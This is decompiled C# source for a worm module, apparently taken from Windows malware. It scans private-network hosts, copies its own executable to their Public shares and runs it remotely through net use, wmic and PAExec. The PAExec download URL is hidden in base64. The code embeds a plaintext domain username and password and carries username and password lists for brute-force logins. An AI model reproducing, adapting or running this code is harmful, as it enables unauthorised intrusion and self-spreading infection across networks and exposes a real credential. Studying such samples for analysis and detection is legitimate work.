using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;

namespace MufMaOSvGyvz
{
	// Token: 0x02000010 RID: 16
	internal class Spread
	{
		// Token: 0x06000044 RID: 68
		public static void RemoteSpread()
		{
			try
			{
				Spread.wHmHGfpgcyEAPS = Spread.InitSpread();
			}
			catch
			{
				return;
			}
			string text = "";
			if (Spread.wHmHGfpgcyEAPS.Count > 0)
			{
				try
				{
					text = Spread.Download();
				}
				catch
				{
					return;
				}
			}
			try
			{
				if (File.Exists(text))
				{
					foreach (string text2 in Spread.wHmHGfpgcyEAPS)
					{
						if (text2.StartsWith("10.") || text2.StartsWith("172.16.") || text2.StartsWith("192.168."))
						{
							try
							{
								if (MainCore.ylIKJJsgdllsSVj == "YES")
								{
									MainCore.CreateProcess("net.exe", "use \\\\" + text2 + " /USER:SHJPOLICE\\amer !Omar2012");
									Thread.Sleep(2000);
									File.Copy(Assembly.GetEntryAssembly().Location, "\\\\" + text2 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location), true);
									if (File.Exists("\\\\" + text2 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location)))
									{
										MainCore.CreateProcess("wmic.exe", string.Concat(new string[]
										{
											"/node:",
											text2,
											" /user:SHJPOLICE\\amer /password:!Omar2012 process call create cmd.exe /c \\",
											text2,
											"\\Users\\Public\\",
											Path.GetFileName(Assembly.GetEntryAssembly().Location)
										}));
									}
								}
								else
								{
									MainCore.CreateProcess("net.exe", "use \\\\" + text2);
									Thread.Sleep(2000);
									File.Copy(Assembly.GetEntryAssembly().Location, "\\\\" + text2 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location), true);
									if (File.Exists("\\\\" + text2 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location)))
									{
										MainCore.CreateProcess("wmic.exe", string.Concat(new string[]
										{
											"/node:",
											text2,
											" process call create cmd.exe /c \\\\",
											text2,
											"\\Users\\Public\\",
											Path.GetFileName(Assembly.GetEntryAssembly().Location)
										}));
									}
								}
								goto IL_290;
							}
							catch
							{
								goto IL_290;
							}
							IL_244:
							MainCore.CreateProcess(text, "\\" + text2 + " -u SHJPOLICE\\amer -p !Omar2012 -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly().Location);
							continue;
							IL_290:
							if (MainCore.ylIKJJsgdllsSVj == "YES")
							{
								goto IL_244;
							}
							MainCore.CreateProcess(text, "\\" + text2 + " -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly().Location);
						}
					}
				}
			}
			catch
			{
				return;
			}
			List<ARP> list = ARP.ExecuteARPPing();
			foreach (ARP arp in list)
			{
				try
				{
					if (arp.IPAddress.StartsWith("10.") || arp.IPAddress.StartsWith("172.16.") || arp.IPAddress.StartsWith("192.168."))
					{
						MAC.GetMAC(arp.MacAddress, arp.IPAddress, "255.255.255.0");
					}
				}
				catch
				{
					return;
				}
			}
			foreach (ARP arp2 in list)
			{
				try
				{
					Regex regex = new Regex(".");
					string string_ = string.Concat(new string[]
					{
						regex.Split(arp2.IPAddress)[0],
						".",
						regex.Split(arp2.IPAddress)[1],
						".",
						regex.Split(arp2.IPAddress)[2]
					});
					List<string> networkVictims = Ping.GetNetworkVictims(string_);
					foreach (string text2 in networkVictims)
					{
						Spread.SjeaxFYLqZIz = text2;
						foreach (string text3 in networkVictims)
						{
							if (text3.StartsWith("10.") || text3.StartsWith("172.16.") || text3.StartsWith("192.168."))
							{
								try
								{
									if (MainCore.ylIKJJsgdllsSVj == "YES")
									{
										MainCore.CreateProcess("net.exe", "use \\\\" + text3 + " /USER:SHJPOLICE\\amer !Omar2012");
										Thread.Sleep(2000);
										File.Copy(Assembly.GetEntryAssembly().Location, "\\\\" + text3 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location), true);
										if (File.Exists("\\\\" + text3 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location)))
										{
											MainCore.CreateProcess("wmic.exe", string.Concat(new string[]
											{
												"/node:",
												text3,
												" /user:SHJPOLICE\\amer /password:!Omar2012 process call create cmd.exe /c \\\\",
												text3,
												"\\Users\\Public\\",
												Path.GetFileName(Assembly.GetEntryAssembly().Location)
											}));
										}
									}
									else
									{
										MainCore.CreateProcess("net.exe", "use \\\\" + text2);
										Thread.Sleep(2000);
										File.Copy(Assembly.GetEntryAssembly().Location, "\\\\" + text3 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location), true);
										if (File.Exists("\\\\" + text3 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly().Location)))
										{
											MainCore.CreateProcess("wmic.exe", string.Concat(new string[]
											{
												"/node:",
												text3,
												" process call create cmd.exe /c \\\\",
												text3,
												"\\Users\\Public\\",
												Path.GetFileName(Assembly.GetEntryAssembly().Location)
											}));
										}
									}
									goto IL_647;
								}
								catch
								{
									goto IL_647;
								}
								IL_5F9:
								MainCore.CreateProcess(text, "\\" + text3 + " -u SHJPOLICE\\amer -p !Omar2012 -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly().Location);
								continue;
								IL_647:
								if (MainCore.ylIKJJsgdllsSVj == "YES")
								{
									goto IL_5F9;
								}
								MainCore.CreateProcess(text, "\\" + text3 + " -d -f -h -s -n 2 -c " + Assembly.GetEntryAssembly().Location);
							}
						}
					}
				}
				catch
				{
					return;
				}
			}
			if (File.Exists(text))
			{
				File.Delete(text);
			}
		}

		// Token: 0x06000045 RID: 69
		public static List<string> InitSpread()
		{
			List<string> list = new List<string>();
			IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
			foreach (IPAddress ipaddress in hostEntry.AddressList)
			{
				if (ipaddress.AddressFamily.ToString() == "InterNetwork")
				{
					list.Add(ipaddress.ToString());
				}
			}
			return list;
		}

		// Token: 0x06000046 RID: 70
		public static string Download()
		{
			string result;
			if (IntPtr.Size == 8)
			{
				result = Spread.RandomName(new Uri(MainCore.DecodeBase64("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
				// -> https://www.poweradmin.com/paexec/paexec.exe
			}
			else
			{
				result = Spread.RandomName(new Uri(MainCore.DecodeBase64("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
				// -> https://www.poweradmin.com/paexec/paexec.exe
			}
			return result;
		}

		// Token: 0x06000047 RID: 71
		public static string RandomName(Uri uri_0)
		{
			string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
			WebClient webClient = new WebClient();
			webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}

		// Token: 0x0400005F RID: 95
		public static List<string> wHmHGfpgcyEAPS = new List<string>();

		// Token: 0x04000060 RID: 96
		public static string SjeaxFYLqZIz = "";

		// Token: 0x04000061 RID: 97
		public static List<string> VimhkXdlfPlXCvI = new List<string>
		{
			"Administrator",
			"Admin",
			"Guest",
			"User",
			"User1",
			"user-1",
			"Test",
			"root",
			"buh",
			"boss",
			"ftp",
			"rdp",
			"rdpuser",
			"rdpadmin",
			"manager",
			"support",
			"work",
			"other user",
			"operator",
			"backup",
			"asus",
			"ftpuser",
			"ftpadmin",
			"nas",
			"nasuser",
			"nasadmin",
			"superuser",
			"netguest",
			"alex"
		};

		// Token: 0x04000062 RID: 98
		public static List<string> caCKFFEBtAvLMh = new List<string>
		{
			"Administrator",
			"administrator",
			"Guest",
			"guest",
			"User",
			"user",
			"Admin",
			"adminTest",
			"test",
			"root",
			"root",
			"123",
			"1234",
			"12345",
			"123456",
			"1234567",
			"12345678",
			"123456789",
			"1234567890",
			"Administrator123",
			"administrator123",
			"Guest123",
			"guest123",
			"User123",
			"user123",
			"Admin123",
			"admin123Test123",
			"test123",
			"password",
			"111111",
			"55555",
			"77777",
			"777",
			"qwe",
			"qwe123",
			"qwe321",
			"qwer",
			"qwert",
			"qwerty",
			"qwerty123",
			"zxc",
			"zxc123",
			"zxcv",
			"uiop",
			"123321",
			"321",
			"love",
			"secret"
		};
	}
}
